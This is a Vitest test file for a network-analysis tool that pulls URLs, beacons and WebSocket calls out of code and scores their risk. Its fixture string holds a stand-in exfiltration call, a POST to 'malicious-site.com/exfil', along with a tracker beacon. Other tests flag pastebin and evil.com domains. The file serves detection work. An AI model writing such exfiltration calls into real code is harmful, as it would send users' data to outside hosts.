import { describe, it, expect } from 'vitest';
import { extractNetworkCalls, calculateNetworkScore } from '@/lib/network-analyzer';

describe('Network Analyzer', () => {
  const sampleCode = `
    fetch('https://api.example.com/data');
    const url = 'https://api.example.com/users';
    fetch('https://malicious-site.com/exfil', { method: 'POST' });
    navigator.sendBeacon('https://tracker.com/track');
    const ws = new WebSocket('wss://socket.example.com');
  `;

  describe('extractNetworkCalls', () => {
    it('should extract URLs from string literals', () => {
      const calls = extractNetworkCalls(sampleCode, 'test.js');
      expect(calls.length).toBeGreaterThan(0);
      expect(calls.some(c => c.url.includes('api.example.com'))).toBe(true);
    });

    it('should detect sendBeacon calls', () => {
      const calls = extractNetworkCalls(sampleCode, 'test.js');
      expect(calls.some(c => c.flags.includes('beacon-api'))).toBe(true);
    });

    it('should detect WebSocket connections', () => {
      const calls = extractNetworkCalls(sampleCode, 'test.js');
      expect(calls.some(c => c.method === 'WS')).toBe(true);
    });

    it('should flag insecure HTTP', () => {
      const calls = extractNetworkCalls("fetch('http://insecure.com/data')", 'test.js');
      expect(calls.some(c => c.flags.includes('insecure-http'))).toBe(true);
    });

    it('should flag suspicious domains', () => {
      const calls = extractNetworkCalls("fetch('https://pastebin.com/raw/abc')", 'test.js');
      expect(calls.some(c => c.flags.includes('suspicious-domain'))).toBe(true);
    });

    it('should flag tracking domains', () => {
      const calls = extractNetworkCalls("fetch('https://google-analytics.com/collect')", 'test.js');
      expect(calls.some(c => c.flags.includes('tracking-domain'))).toBe(true);
    });

    it('should return empty for code with no URLs', () => {
      const calls = extractNetworkCalls('const x = 1 + 2;', 'test.js');
      expect(calls).toEqual([]);
    });

    it('should deduplicate URLs', () => {
      const code = "fetch('https://example.com/api'); fetch('https://example.com/api');";
      const calls = extractNetworkCalls(code, 'test.js');
      const urls = calls.map(c => c.url);
      const unique = [...new Set(urls)];
      expect(urls.length).toBe(unique.length);
    });
  });

  describe('calculateNetworkScore', () => {
    it('should return 0 for no calls', () => {
      expect(calculateNetworkScore([])).toBe(0);
    });

    it('should increase with risk level', () => {
      const lowCalls = [{ url: 'https://example.com', method: 'GET', domain: 'example.com', risk: 'low', flags: [] }];
      const highCalls = [{ url: 'https://evil.com', method: 'POST', domain: 'evil.com', risk: 'critical', flags: [] }];
      expect(calculateNetworkScore(highCalls)).toBeGreaterThan(calculateNetworkScore(lowCalls));
    });

    it('should cap at 100', () => {
      const manyCalls = Array(20).fill(null).map(() => ({
        url: 'https://evil.com', method: 'POST', domain: 'evil.com', risk: 'critical', flags: [],
      }));
      expect(calculateNetworkScore(manyCalls)).toBeLessThanOrEqual(100);
    });
  });
});
